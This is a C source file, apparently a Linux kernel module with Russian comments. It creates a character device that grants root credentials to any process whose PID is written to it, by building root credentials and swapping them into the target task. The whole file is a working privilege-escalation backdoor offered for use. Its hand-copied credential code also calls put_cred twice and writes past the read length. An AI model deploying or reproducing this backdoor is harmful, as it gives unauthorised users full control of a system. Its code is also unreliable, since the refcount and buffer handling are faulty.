#include "GRoot.h"

/*
        Функция регистрирует файл в ядре. Maj номер выдается ядром.
        Новые номера печатаются в лог.
*/
static int __init InitModule(void)
{
        major = register_chrdev(0, DEVICE_NAME, &fops);
        
        if(major < 0) {    
                printk(KERN_ALERT DEVICE_NAME": Registering the character device failed with %d\n", major);
                
                return major;
        }
        printk(KERN_ALERT DEVICE_NAME": MJ %d MN 1\n", major);
        
        return 0;
}

static void __exit ExitModule(void)
{
        unregister_chrdev(major, DEVICE_NAME);    
}

module_init(InitModule);
module_exit(ExitModule);

static int device_open(struct inode *inode, struct file *file)
{
        try_module_get(THIS_MODULE);

        return 0;
}
static int device_release(struct inode *inode, struct file *file)
{
        module_put(THIS_MODULE);

        return 0;
}
/*
        Функция читает (переопределяет функцию записи в файл) из файла (создается на стороне с использованием maj
         и min номеров напечатаных в лог) пид процесса, который нужно рутовать. Затем проверяет пид. 
        Если пид равен или меньше 0, функция завершается.
        После, ищет процесс, перебирая все и сравнивая введенный пид с каждым. Если процесс найден, то берет копию
        структуры cred у процесса init и заменяет им старую структуру.
*/
static ssize_t device_write(struct file *filep, const char *buffer, size_t lenght, loff_t *offset)
{
        char data[BUF_LEN] = "";
        size_t readed = 0;
        struct task_struct *find;
        int pid = -1;
        
        while(readed < BUF_LEN && readed < lenght){
                get_user(*(data + readed), buffer++);
                readed++;
        }
        if(readed >= BUF_LEN - 1){
                data[BUF_LEN - 1] = '\0';
        } else {
                data[readed + 1] = '\0';
        }
        
        pid = simple_strtoul(data, NULL, 0);
        printk(KERN_ALERT DEVICE_NAME": Refer process %s (%d)\n", current->comm, current->pid);
        if(pid <= 0){
                printk(KERN_ALERT DEVICE_NAME": Not valid pid %d\n", pid);
                return readed;
        }        
        printk(KERN_ALERT DEVICE_NAME": Finding pid %d...\n", pid);
        for_each_process(find){
                if(pid == find->pid){;
                        printk(KERN_ALERT DEVICE_NAME": Set root to %s (%d)...\n", find->comm, find->pid);
                        CommitCred(prepare_kernel_cred(0), find);                                              
                        printk(KERN_ALERT DEVICE_NAME": Success!\n");
                        break;
                }
        }
        if(find == &init_task){
                printk(KERN_ALERT DEVICE_NAME": pid %d not found\n", pid);
        }

        return readed;
}
/*
       Функция заменяет старую структуру cred у процесса task на новую new.
       Оригинал функции "int commit_creds(struct cred *new)"
       находится в файле linux/cred.с. Актуально для ядра версии 3.16.
*/
void CommitCred(struct cred *new, struct task_struct *task)
{
        const struct cred *old = task->real_cred;        
        
        get_cred(new);

        if (new->user != old->user)
                atomic_inc(&new->user->processes);
        rcu_assign_pointer(task->real_cred, new);
        rcu_assign_pointer(task->cred, new);
        if (new->user != old->user)
                atomic_dec(&old->user->processes);
        
        put_cred(old);
        put_cred(old);
}
